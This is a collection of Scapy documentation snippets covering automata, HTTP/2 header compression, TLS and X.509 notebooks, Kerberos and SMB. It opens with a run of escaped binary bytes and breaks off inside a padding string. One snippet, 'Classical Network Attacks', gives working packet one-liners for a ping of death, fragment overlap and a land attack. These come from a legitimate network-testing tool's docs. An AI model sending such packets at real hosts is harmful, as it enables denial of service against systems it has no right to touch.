\\xd8\\xaeb\\x08*\\xb1HQ\\xf8O~\\x13d\\x12\\xc2%\\xd1\\x804\\x99\\xae\\x14dg+\\xb5\\x9b\\xf7\\xf0st\\x02\\x19&\\xd1Y)\\xcb0F6\\x9b\\x122\\xac\\xda\\x01\\xe4\\xb8\\xa7\\xcb\\x91YT#v\\xd4\\x94\\xee]\\x80\\'\\n\\xa8\\'\\x92\\x1b\\x95\\xc6D\\x8e.\\x86\\xf7\\xcdl^k\\x8a\\xf5er\\x1e\\xda\\xc3kRKM\\xaf*\\xbaD\\x0e\\xdb\\'G\\x83l\\xb7pz\\x99\\x1b\\xcb\\xcc\\x83\\xe4\\xf5\\xc6\\xb3\\xb9\\xb3\\xde\\xa01\\x03z#`o\\x84\\xa5\\x05\\xe8)@V\\x9eC\\xb6).\\xff\\x02\\xde`d^\\x81\\xb3\\xe0H\\x7f\\xb5\\xfc\\xff\\xe8N,\\x7f\\xb3\\xfc\\xbf\\x93=P\\x86\\xb6}~ig8\\xff\\xdf\\xcc<\\xd9\\x8eX0\\x9e\\xce\\xa3\\xea\\xb1y<\\x99\\xb9\\xd9D\\xbe3k\\xd7\\xecV\\xb4\\xdb\\xcfL\\xeeo$5\\xbf+nM,l\\x0eO\\x9b\\x11\\x1a&\\xe0e\\x03B#\\x95\\x10tc\\x1c\\x13R\\x89d\\x1a\\x19\\x0c\\xe3\\xbe\\xb8I9\\xc8k\\x88\\xed\\x08\\xcc\\xdc\\xac\\x00t\\xb0<v-\\xa15uT\\\\\\x01\\x83\\x08!\\x0e\\x06\\xf0Ag\\x01[\\xf8Z;\\x02\\xd1\\xc7\\xc6\\x14/\\xacG\\x990\\xc7\\xa4\\x0e\\x0b]X=3!\\xe2\\xa3\\xc9\\x82O\\x96\\x19]L\\xe8P\\xe0\\x7f>\\xdb\\x1b\\xa3M\\x17\\x84\\xd8#\\x80f\\x13\\xa8a+\"\\xa2o\\xc5&tHML\\x85\\xc1d>\\xde\\xc5;\\xeb\\xf3~\\xbb)6\\x97i\\xf6\\xbcN\\xc7\\xc7m\\x9a\\xb8\\xea\\x0f&\\xd7\\xbax\\xd0R\\x9b7\\x8d\\x9bl\\')\\x8bK6\\x08_\\xd3\\xbf\\xc4>=B\\x9f6\\xcd\\xdaW\\xc3\\x1b\\xec\\xc3W\\xcb\\xb7\\x8f\\xcf\\xc5\\x83o\\x96o7m\\xe5\\xc0\\xd6\\x12\\xed\\x93Ky\\xc1\\xb7_ \\xde\\xed0\\xe4\\xf1S\\xe2\\xae\\x94\\'\\xd5\\xcb|F\\xbf==\\xcd]\\xd5\\xb5C\\xb3\\xa9\\xf6\\xad\\xf1\\x90\\xe4\\xe4\\xe8\\xf6\\x19\\xf2\\x0b\\x08\\xd8\\x0c\\xa7\\x9d\\x00\\xc0\\x9b\\xb63z\\x1cU3\\x06T\\xa6\\x04\\x93\\x81\\xf4@y\\x06\\x16\\x1a\\xb2/2\\xb3aH\\x0f|\\x94-\\xea\\xa0\\xfb\\xddd\\xfc7&\\xd45\\xceT\\xb1B\\xa8\\x9d%(\\x81\\xf7\\x0e\\xd4&\\xb9\\xb8\\xf9}GP\\x98n\\xce\\x96\\x02\\xc8\\x8d\\x81\\xef\\xa2\\x99\\xd2\\x92\\xfaT\\x06\\xdd\\xdc\\xc2~\\xd8d\\x80\\xb6\\x03\\xaf\\x95\\x9d\\xb5\\xcd\\x8c\\x9f$\\xc8\\xb48\\x06Y\\xc1\\xb2h(\\xe4v]\\xf5\\x1a\\xedEMfu\\\\\\xa6\\xc4\\x9a\\xbb_=\\xbdJX\\xe3h\\xf7\\xf8\\xbe\\x7f\\xefv\\xf5\\\\\\xa5Ro\\x1fYwh\\xec\\x9e7\\x8e\\x98\\xf5\\x94\\xd4g\\x8d]\\x9f\\x86\\xe5\\xf0\\x81\\xe0n\\xdf[%\\x96\\xdau\\x1d\\xaaQ\\x9b\\r\\xdb\\xbb!cF\\xc8\\'s\\xec\\xac\\xd7\\x12\\xaf\\x065gVO\\x11\\xda\\xb7\\xc5d\\xe7\\xd8\\xbe?\\x11\\xd5\\x9c\\x88ka\\xde\\x15t\\xa6.:\\xb2\\x19(O\\x0c\\x07F\\x8b8\\xb7V\\xac\\x9c\\x8e\\x89\\x85>\\xff\\xc3\\x8f]\\xac\\t\\xe2\\t3Y>\\x91\\x91\\x0333\\xbeq\\xfb\\xa7\\xa94\\xcd\\x9fh\\x9d\\xc3\\xc6\\xedY\\xaa\\xda\\xd7Ng\\xe70x\\xac\\x1f\\xa8DX\\x8fl\\x9f\\x88\\xbcb\\xcb\\xda\\xbb\\xcc~\\xa0\\xb49\\xaec\\xd8\\n\\xd1\\xa9l0&\\xcc\\xee\\xa3\\n\\x89\\xe2\\x93\\xf8;V\\x83\\xa9\\xa6\\xd8^\\x86\\xf6h v\\xef\\xb2n\\xe3\\xce\\xack\\x83\\xd3\\x93#Q\\xdd\\xddMWf\\xf6\\x85\\xda^\\xe2\\x16\\x7f\\x08\\xc7\\x00\\xfa9v\\x06\\xc7\\xf4\\x04:\\xb3I\\xa3\\xde\\'\\x01\\xff&\\x96t\\'3\\xb4\\xb2|\\xa3\\xaa\\x81\\x9e=:(\\xec\\x0f*\\x07N\\xd8\\xff\\xf8:\\x9a\\xde\\x8e\\xa2\\x90}J\\xf3\\x87\\xc6}&\\xf3pQ6\\xedf\\xed|b\\x99\\xc9Yn7uqQ\\xbdl\\xa8\\xdb5\\xe8\\xbd\\x0e\\x0f\\x9b\\xd1\\x17rM\\xe4\\xc8\\xef_\\x99\\xe5\\x04il\\xb1\\x95Y\\xe2S+3\\x03\\xb9>3\\x08\\t\\x1d\\xb6%\\xc5S\\x14L\\tVj*\\x08\\x04\\xd3$\\xc2>\\x88\\x04\\x85\\xc6\\x842\\xf0P&%\\x1c\\xec\\x98\\xb7\\x84C\\xbe\\x12^\\x9d\\xed\\xcc\\x97s\\xca#z0\\xe1\\xe2\\x11\\xd7z\\xe8\\x8e\\xb4\\x88L\\xc6\\x06\\xb5\\x82\\xa6\\xaa\\xad,\\xcd\\x06\\xd4Q\\xdd\\x9eG\\xf5h\\x93}\\x0f\\x13.4\\xc5\\xee\\xb2T}\\xc8]ej\\xd3;\\xe3\\xd8\\xd1k\\xe5\\xeb\\xb3\\x199)\\xd4k\\xd3\\x87V\\xf5n\\x12\\xd9\\xabR\\xa7\\xe6\\xf6@rzm\\x07\\xf9`14\\x10En\\x12eJY\\xb4\\'\\xd9DY\\xe5<f\\xc8\\xd9\\xecZ\\xee)\\x82\\xbe\\tf\\xdd\\xba\\x13+\\xdf,\\xb3v\\xb2\\xe5\\xcai~\\xfc`e\\xea\\x8bu\\xdc3\\x94\\xbe\\x15\\xd6\\xac\\x8a+f\\xc29\\x1d\\xe7\\xa7\\xe7N\\xf3\"=j\\xbb\\x8e\\x1a\\xcd\\xbb\\x92b\\x1dw\\xcf\\x9c\\xd3\\x95\\xac\\xf9\\xf5\\xab\\x9e\\'\n```\n\n----------------------------------------\n\nTITLE: Defining Transitions in Scapy Automaton\nDESCRIPTION: This snippet shows how to define various types of transitions in a Scapy automaton, including conditions, receive conditions, timeouts, and EOF handling.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nclass Example(Automaton):\n    @ATMT.state()\n    def WAITING(self):\n        pass\n\n    @ATMT.condition(WAITING)\n    def it_is_raining(self):\n        if not self.have_umbrella:\n            raise self.ERROR_WET()\n\n    @ATMT.receive_condition(WAITING, prio=1)\n    def it_is_ICMP(self, pkt):\n        if ICMP in pkt:\n            raise self.RECEIVED_ICMP(pkt)\n            \n    @ATMT.receive_condition(WAITING, prio=2)\n    def it_is_IP(self, pkt):\n        if IP in pkt:\n            raise self.RECEIVED_IP(pkt)\n    \n    @ATMT.timeout(WAITING, 10.0)\n    def waiting_timeout(self):\n        raise self.ERROR_TIMEOUT()\n```\n\n----------------------------------------\n\nTITLE: SMB Server with Encryption Requirements\nDESCRIPTION: Demonstrates two methods to require encryption in SMB server: globally for SMB 3.0.0+ and per-share for SMB 3.1.1+.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/smb.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n# Method 1: require encryption globally (available in SMB 3.0.0+)\n>>> smbserver(..., REQUIRE_ENCRYPTION=True)\n# Method 2: for a specific share (only available in SMB 3.1.1+)\n>>> smbserver(..., shares=[SMBShare(name=\"Scapy\", path=\"/tmp\", encryptdata=True)])\n```\n\n----------------------------------------\n\nTITLE: Generating UML Diagram for Scapy Fields Objects\nDESCRIPTION: This snippet demonstrates how to use pyreverse to generate a UML representation of Scapy's Fields objects. It includes setting up the environment and running the pyreverse command.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n(activate a virtualenv)\npip install pylint\ncd scapy/\npyreverse -o png -p fields scapy/fields.py\n```\n\n----------------------------------------\n\nTITLE: Comparing Compressed vs Uncompressed String Sizes in HTTP/2\nDESCRIPTION: Creates both compressed and uncompressed versions of a URL path string using HPackZString and HPackLiteralString, then compares their wire-lengths to demonstrate compression benefits.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_33\n\nLANGUAGE: python\nCODE:\n```\nz_str = h2.HPackZString('/search?q=scapy')\nunz_str = h2.HPackLiteralString('/search?q=scapy')\n\nprint(len(str(z_str)), len(str(unz_str)))\n```\n\n----------------------------------------\n\nTITLE: Reading and Parsing Client TLS Record\nDESCRIPTION: Reads TLS client record from file and parses it using Scapy's TLS layer\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook3_tls_compromised.ipynb#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nrecord1_str = open('raw_data/tls_session_compromised/01_cli.raw', 'rb').read()\nrecord1 = TLS(record1_str)\nrecord1.msg[0].show()\n```\n\n----------------------------------------\n\nTITLE: Configuring Timers in Scapy Automaton\nDESCRIPTION: This snippet demonstrates how to configure timeout values during class initialization in a Scapy Automaton using the timer_by_name method. It sets up a timer for a waiting state.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\nclass Example(Automaton):\n    def __init__(self, *args, **kwargs):\n        super(Example, self).__init__(*args, **kwargs)\n        timer = self.timer_by_name(\"waiting_timeout\")\n        timer.set(1)\n\n    @ATMT.state(initial=1)\n    def WAITING(self):\n        pass\n\n    @ATMT.state(final=1)\n    def END(self):\n        pass\n\n    @ATMT.timeout(WAITING, 10.0)\n    def waiting_timeout(self):\n        raise self.END()\n```\n\n----------------------------------------\n\nTITLE: TriggerDrain Usage Example\nDESCRIPTION: Demonstration of using TriggerDrain with TriggeredValve to control message flow based on triggers.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_22\n\nLANGUAGE: pycon\nCODE:\n```\n>>> a = CLIFeeder()\n>>> d = TriggerDrain(lambda msg: True) # Pass messages and trigger when a condition is met\n>>> d2 = TriggeredValve()\n>>> s = ConsoleSink()\n>>> a > d > d2 > s\n>>> d ^ d2 # Link the triggers\n>>> p = PipeEngine(s)\n>>> p.start()\nINFO: Pipe engine thread started.\n>>> \n>>> a.send(\"this will be printed\")\n>'this will be printed'\n>>> a.send(\"this won't, because the valve was switched\")\n>>> a.send(\"this will, because the valve was switched again\")\n>'this will, because the valve was switched again'\n>>> p.stop()\n```\n\n----------------------------------------\n\nTITLE: Defining a Simple Automaton in Scapy\nDESCRIPTION: This snippet shows how to create a basic automaton called HelloWorld using Scapy's Automaton class. It defines a BEGIN state and a transition to an END state.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_6\n\nLANGUAGE: Python\nCODE:\n```\nclass HelloWorld(Automaton):\n    @ATMT.state(initial=1)\n    def BEGIN(self):\n        print(\"State=BEGIN\")\n\n    @ATMT.condition(BEGIN)\n    def wait_for_nothing(self):\n        print(\"Wait for nothing...\")\n        raise self.END()\n```\n\n----------------------------------------\n\nTITLE: Parsing Server Key Exchange and Related Messages\nDESCRIPTION: Parses multiple TLS records including CertificateStatus, ServerKeyExchange, and ServerHelloDone\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nrecord4 = TLS(open('raw_data/tls_session_protected/04_srv.raw', 'rb').read())\nrecord4.show()\n```\n\n----------------------------------------\n\nTITLE: CAN Interface Setup Commands\nDESCRIPTION: Shell commands for setting up CAN interfaces with specific bitrates for testing.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_46\n\nLANGUAGE: bash\nCODE:\n```\nip link set can0 up type can bitrate 500000\nip link set can1 up type can bitrate 500000\n```\n\n----------------------------------------\n\nTITLE: Adding Accept and User-Agent Headers from Dynamic Table in HTTP/2\nDESCRIPTION: Retrieves and adds both the 'accept' and 'user-agent' headers from the dynamic table. Creates indexed header references for both headers and adds them to the headers frame payload.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_41\n\nLANGUAGE: python\nCODE:\n```\naccept_hdr_idx = tblhdr.get_idx_by_name_and_value('accept', 'text/html')\naccept_hdr = h2.HPackIndexedHdr(index = accept_hdr_idx)\naccept_hdr.show()\nhdrs_frm.payload.hdrs.append(accept_hdr)\nua_hdr_idx = tblhdr.get_idx_by_name_and_value('user-agent', 'Scapy HTTP/2 Module')\nua_hdr = h2.HPackIndexedHdr(index = ua_hdr_idx)\nua_hdr.show()\nhdrs_frm.payload.hdrs.append(ua_hdr)\n```\n\n----------------------------------------\n\nTITLE: Setting Up ECDH Key Exchange\nDESCRIPTION: Configures the Perfect Forward Secrecy (PFS) using X25519 key exchange by loading private keys for both client and server.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook4_tls13.ipynb#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# The PFS relies on the ECDH secret below being kept from observers, and deleted right after the key exchange\nfrom cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey\n\n# Used in records 2-6 + 8\nx25519_client_privkey = open('raw_data/tls_session_13/cli_key.raw', 'rb').read()\nsess.tls13_client_privshares[\"x25519\"] = X25519PrivateKey.from_private_bytes(x25519_client_privkey)\n\n# Used in records 7 + 9\nx25519_server_privkey = open('raw_data/tls_session_13/srv_key.raw', 'rb').read()\nsess.tls13_server_privshare[\"x25519\"] = X25519PrivateKey.from_private_bytes(x25519_server_privkey)\n```\n\n----------------------------------------\n\nTITLE: Injecting Raw Bytes into Scapy Packets\nDESCRIPTION: Demonstrates how to use RawVal to inject arbitrary byte strings into packet fields, even if they don't match the expected type. This is useful for developing proof-of-concepts.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\n>>> pkt = IP(len=RawVal(b\"NotAnInteger\"), src=\"127.0.0.1\")\n>>> bytes(pkt)\nb'H\\x00NotAnInt\\x0f\\xb3er\\x00\\x01\\x00\\x00@\\x00\\x00\\x00\\x7f\\x00\\x00\\x01\\x7f\\x00\\x00\\x01\\x00\\x00'\n```\n\n----------------------------------------\n\nTITLE: Implementing TransformDrain in Scapy PipeTool\nDESCRIPTION: Implementation of a TransformDrain class that inherits from Drain. It applies a transformation function to messages and sends them through either low or high channels.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\nclass TransformDrain(Drain):\n    def __init__(self, f, name=None):\n        Drain.__init__(self, name=name)\n        self.f = f\n    def push(self, msg):\n        self._send(self.f(msg))\n    def high_push(self, msg):\n        self._high_send(self.f(msg))\n```\n\n----------------------------------------\n\nTITLE: Registering DNT Header in HPack Dynamic Table\nDESCRIPTION: This snippet registers the previously created DNT header in the HPack Dynamic table for efficient lookups in subsequent requests.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_43\n\nLANGUAGE: python\nCODE:\n```\ntblhdr.register(dnt_hdr)\n```\n\n----------------------------------------\n\nTITLE: Scapy PDF Export Example\nDESCRIPTION: Example showing how to export packet data to PDF format using PyX.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n>>> p=IP()/ICMP()\n>>> p.pdfdump(\"test.pdf\")\n```\n\n----------------------------------------\n\nTITLE: Installing Scapy Development Version with Git\nDESCRIPTION: Commands to clone and install the latest development version of Scapy from GitHub repository.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git clone https://github.com/secdev/scapy.git\n$ cd scapy\n$ pip install .\n```\n\n----------------------------------------\n\nTITLE: Configuring TUN Interface on Linux\nDESCRIPTION: Shell commands to bring up the TUN interface and assign IP addresses on Linux systems.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/tuntap.rst#2025-04-23_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nsudo ip link set tun0 up\nsudo ip addr add 192.0.2.1 peer 192.0.2.2 dev tun0\n```\n\n----------------------------------------\n\nTITLE: Handling LDAP Bind Request with SPNEGO in Python\nDESCRIPTION: Shows an example of using the NTLM token in an LDAP bind request and processing the server's response.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/gssapi.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nwhile token:\n    resp = self.sr1(\n        LDAP_BindRequest(\n            bind_name=ASN1_STRING(b\"\"),\n            authentication=LDAP_Authentication_SaslCredentials(\n                mechanism=ASN1_STRING(b\"SPNEGO\"),\n                credentials=ASN1_STRING(bytes(token)),\n            ),\n        )\n    )\n    sspcontext, token, status = clissp.GSS_Init_sec_context(\n        self.sspcontext, GSSAPI_BLOB(resp.protocolOp.serverSaslCreds.val)\n    )\n```\n\n----------------------------------------\n\nTITLE: Classical Network Attacks\nDESCRIPTION: Examples of various network attack techniques including malformed packets, ping of death, and land attacks.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_44\n\nLANGUAGE: python\nCODE:\n```\nsend(IP(dst=\"10.1.1.5\", ihl=2, version=3)/ICMP())\n\nsend( fragment(IP(dst=\"10.0.0.5\")/ICMP()/(\"X\"*60000)) )\n\nsend(IP(dst=target, id=42, flags=\"MF\")/UDP()/(\"X\"*10))\nsend(IP(dst=target, id=42, frag=48)/(\"X\"*116))\nsend(IP(dst=target, id=42, flags=\"MF\")/UDP()/(\"X\"*224))\n\nsend(IP(src=target,dst=target)/TCP(sport=135,dport=135))\n```\n\n----------------------------------------\n\nTITLE: Implementing List and Length Fields in Scapy\nDESCRIPTION: Examples of list and length field types in Scapy, used for handling variable-length data structures.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\nFieldList(name, default, field, fld=None, shift=0, length_from=None, count_from=None)\n  # A list assembled and dissected with many times the same field type\n    \n  # field: instance of the field that will be used to assemble and disassemble a list item\n  # length_from: name of the FieldLenField holding the list length\n     \nFieldLenField     #  holds the list length of a FieldList field\nLEFieldLenField\n\nLenField          # contains len(pkt.payload)\n\nPacketField       # holds packets\nPacketLenField    # used e.g. in ISAKMP_payload_Proposal\nPacketListField\n```\n\n----------------------------------------\n\nTITLE: Configuring Scapy's Logger in Python\nDESCRIPTION: This snippet shows how to configure Scapy's logger using Python's logging module. It sets the log level to CRITICAL, which will suppress most log messages except for critical failures.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/extending.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport logging\nlogging.getLogger(\"scapy\").setLevel(logging.CRITICAL)\n```\n\n----------------------------------------\n\nTITLE: Certificate Signing\nDESCRIPTION: Computes RSA signature for certificate data.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\n# We can compute the RSA signature over the part of the certificate which is to be signed\nprivkey.sign(raw(cert.tbsCertificate))\n```\n\n----------------------------------------\n\nTITLE: Initializing HTTP/2 Header Table\nDESCRIPTION: Creates a new HPackHdrTable object for processing headers received from the server, with specified maximum header table size.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_27\n\nLANGUAGE: python\nCODE:\n```\nsrv_tblhdr = h2.HPackHdrTable(dynamic_table_max_size=max_hdr_tbl_sz, dynamic_table_cap_size=max_hdr_tbl_sz)\n```\n\n----------------------------------------\n\nTITLE: Viewing ICMP Echo Replies in Scapy\nDESCRIPTION: Python code showing the output of the ICMP Echo answering machine in Scapy when receiving ping requests.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/tuntap.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n>>> am()\nReplying 192.0.2.1 to 192.0.2.2\nReplying 192.0.2.1 to 192.0.2.2\nReplying 192.0.2.1 to 192.0.2.2\n```\n\n----------------------------------------\n\nTITLE: Loading nRF Sniffer and Extcap Interfaces in Scapy\nDESCRIPTION: This snippet shows how to load the nRF Sniffer contribution and extcap interfaces in Scapy. It then displays the available interfaces, including the nRF Sniffer for Bluetooth LE.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\n>>> load_contrib(\"nrf_sniffer\")\n>>> load_extcap()\n>>> conf.ifaces\nSource           Index  Name                          Address\nnrf_sniffer_ble  100    nRF Sniffer for Bluetooth LE  /dev/ttyUSB0-None\n[...]\n```\n\n----------------------------------------\n\nTITLE: 802.11 Payload Class Detection in Python/Scapy\nDESCRIPTION: Example of custom payload class detection for 802.11 packets based on cipher flag\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nclass Dot11(Packet):\n    def guess_payload_class(self, payload):\n        if self.FCfield & 0x40:\n            return Dot11WEP\n        else:\n            return Packet.guess_payload_class(self, payload)\n```\n\n----------------------------------------\n\nTITLE: Decoding X.509 Certificate with Scapy BERcodec_Object\nDESCRIPTION: This snippet demonstrates how to decode an X.509 certificate using Scapy's BERcodec_Object. It specifies the ASN1_Class_X509 context and shows the decoded certificate structure.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_5\n\nLANGUAGE: Python\nCODE:\n```\n>>> (dcert,remain) = BERcodec_Object.dec(cert, context=ASN1_Class_X509)\n>>> dcert.show()\n```\n\n----------------------------------------\n\nTITLE: Defining Bar1 and Bar2 Packet Classes in Python for Scapy\nDESCRIPTION: This code defines two simple packet classes, Bar1 and Bar2, each with a single field. These are used to demonstrate layer binding and automatic type field computation in Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_14\n\nLANGUAGE: Python\nCODE:\n```\nclass Bar1(Packet):\n    fields_desc = [\n          IntField(\"val\", 0),\n          ]\n\nclass Bar2(Packet):\n    fields_desc = [\n          IPField(\"addr\", \"127.0.0.1\")\n          ]\n```\n\n----------------------------------------\n\nTITLE: Enhanced Private Key Loading\nDESCRIPTION: Loads private key using Scapy's crypto-enhanced wrapper.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\n# Let's reload the key with Scapy's crypto-enhanced wrapper\nprivkey = PrivKey('raw_data/pki/ca_key.der')\n```\n\n----------------------------------------\n\nTITLE: Printing HTTP/2 Stream Headers in Python\nDESCRIPTION: This snippet prints the headers from an HTTP/2 stream response. It accesses the second element of the stream_txt list, which contains the headers.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_31\n\nLANGUAGE: python\nCODE:\n```\nprint(stream_txt[1])\n```\n\n----------------------------------------\n\nTITLE: Changing Kerberos Passwords in Python\nDESCRIPTION: This snippet shows how to change a user's own password and how to change another user's password using the kpasswd function from scapy.layers.kerberos.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\n>>> kpasswd(\"User1@domain.local\")\nEnter password: **********\nEnter NEW password: *********\n\n>>> kpasswd(\"Administrator@domain.local\", \"User1@domain.local\")\nEnter password: **********\nEnter NEW password: *********\n```\n\n----------------------------------------\n\nTITLE: Generating Kerberos AES128 Key with Custom Iteration Count in Python\nDESCRIPTION: This example demonstrates generating a Kerberos AES128 key using a specific password, salt, and iteration count. It uses the AES128_CTS_HMAC_SHA1_96 encryption type and packs the iteration count as a big-endian integer.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\n>>> k = Key.string_to_key(EncryptionType.AES128_CTS_HMAC_SHA1_96, b\"password\", b\"ATHENA.MIT.EDUraeburn\", struct.pack(\">L\", 1200))\n>>> print(k.key.hex())\n'4c01cd46d632d01e6dbe230a01ed642a'\n```\n\n----------------------------------------\n\nTITLE: Marking Non-Indexed Scapy Contrib Modules in Python\nDESCRIPTION: Specifies how to mark a Scapy contrib module that should not be indexed by the explore() function. This is used for modules that don't contain any packets.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\n# scapy.contrib.status = skip\n```\n\n----------------------------------------\n\nTITLE: RSA Key Data Comparison\nDESCRIPTION: Compares original and modified RSA key data structures.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nprint('Original data: %r...' % keystr[:13])\nprint('New version bytes:          %r' % raw(privkey.version))\nprint('New modulus bytes:                      %r...' % raw(privkey.modulus)[:6])\nprint('Rebuilt data:  %r...' % raw(privkey)[:13])\n```\n\n----------------------------------------\n\nTITLE: Loading TLS Layer in Scapy\nDESCRIPTION: Imports Scapy and loads the TLS protocol layer for analysis\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook3_tls_compromised.ipynb#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.all import *\nload_layer('tls')\n```\n\n----------------------------------------\n\nTITLE: Signature Algorithm Check\nDESCRIPTION: Displays the signature algorithm used in the certificate.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\ncert.signatureAlgorithm.algorithm\n```\n\n----------------------------------------\n\nTITLE: Defining Padding in HTTP/2 Frame Structure in Python\nDESCRIPTION: This snippet shows a padding definition used in HTTP/2 frame implementations in Scapy. It defines a sequence of null bytes (\\x00) that can be used for padding within HTTP/2 frames, which is important for frame alignment and security features like obfuscating frame sizes.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\npadding   = '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0